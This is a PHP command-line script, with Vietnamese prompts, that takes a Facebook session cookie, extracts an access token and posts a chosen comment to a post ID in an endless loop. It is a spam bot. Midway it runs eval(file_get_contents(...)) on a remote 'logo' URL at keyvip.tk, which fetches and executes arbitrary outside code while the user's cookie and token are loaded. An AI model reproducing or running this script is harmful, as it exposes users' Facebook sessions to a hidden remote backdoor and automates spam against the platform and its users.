session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
error_reporting(0);
$res = "\033[0m";
$red = "\033[1;91m";
$green = "\033[1;92m";
$yellow = "\033[1;93m";
$blue = "\033[1;94m";
$pink = "\033[1;95m";
$bcyan = "\033[1;96m";
$white = "\033[1;97m";
$i_bcyan = "\033[1;3;96m";
$i_green = "\033[1;3;92m";
$i_red = "\033[1;3;91m";
$i_pink = "\033[1;3;95m";
$br_green = "\033[42m";
$br_white = "\033[47m";
$u_white = "\033[1;4;97m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$res = "\033[0m";
$tim = "\033[1;35m";
$red = "\033[0;31m";
$green = "\033[0;32m";
$yellow = "\033[0;33m";
$white = "\033[0;37m";
@system('clear');
echo "\033[1;37m~\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m => \033[1;32mNhập Cookie Facebook : \033[1;97m";
$cookie = trim(fgets(STDIN));
while (true) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "authority: m.facebook.com";
    $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
    $head[] = "cache-control: max-age=0";
    $head[] = "upgrade-insecure-requests: 1";
    $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $head[] = "sec-fetch-site: none";
    $head[] = "sec-fetch-mode: navigate";
    $head[] = "sec-fetch-user: ?1";
    $head[] = "sec-fetch-dest: document";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $access = curl_exec($ch);
    curl_close($ch);
    if (explode('\",\"useLocalFilePreview', explode('accessToken\":\"', $access) [1]) [0]) {
        $access_token = explode('\",\"useLocalFilePreview', explode('accessToken\":\"', $access) [1]) [0];
        if (json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $access_token))->{'id'}) {
            $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $access_token))->{'id'};
            $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $access_token))->{'name'};
            break;
        } else {
            echo "\033[1;33mCookie die!!\033[1;91m Nhập Cookie Mới: \033[1;93m";
            $cookie = trim(fgets(STDIN));
        }
    } else {
        echo "\033[1;33mCookie die!!\033[1;91m Nhập Cookie Mới: \033[1;93m";
        $cookie = trim(fgets(STDIN));
    }
}
echo "\033[1;93mNhập Time Delay:\033[1;95m ";
$timedelay = trim(fgets(STDIN));
echo "\033[1;93mNhập Nội Dung Cmt:\033[1;95m ";
$msg = trim(fgets(STDIN));
echo "\033[1;93mNhập ID Cmt: \033[1;95m ";
$id = trim(fgets(STDIN));
@system('clear');
eval(file_get_contents("https://keyvip.tk/logo.php"));
while (true) {
    cmt($access_token, $id, $cookie, $msg);
    $timme = date('H:i:s');
    $dem = $dem + 1;
    echo "\033[1;33m[$dem\033[1;33m] ";
    usleep(10000);
    echo "\033[1;31m● ";
    usleep(10000);
    echo "\033[1;36m$timme";
    usleep(10000);
    echo "\033[1;31m ● ";
    usleep(10000);
    echo "\033[1;36mCMT ";
    usleep(10000);
    echo "\033[1;31m● ";
    usleep(10000);
    echo "\033[1;32m" . $id . "
 ";
    for ($time = $timedelay;$time > - 1;$time--) {
        echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi  $time      \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time        \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
}
echo "$res                                  \r";
    
}
function cmt($access_token, $id, $cookie, $msg) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/' . $id . '/comments');
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "authority: m.facebook.com";
    $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
    $head[] = "cache-control: max-age=0";
    $head[] = "upgrade-insecure-requests: 1";
    $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $head[] = "sec-fetch-site: none";
    $head[] = "sec-fetch-mode: navigate";
    $head[] = "sec-fetch-user: ?1";
    $head[] = "sec-fetch-dest: document";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $data = array('message' => $msg, 'access_token' => $access_token);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $access = curl_exec($ch);
    curl_close($ch);
    return json_decode($access);
}
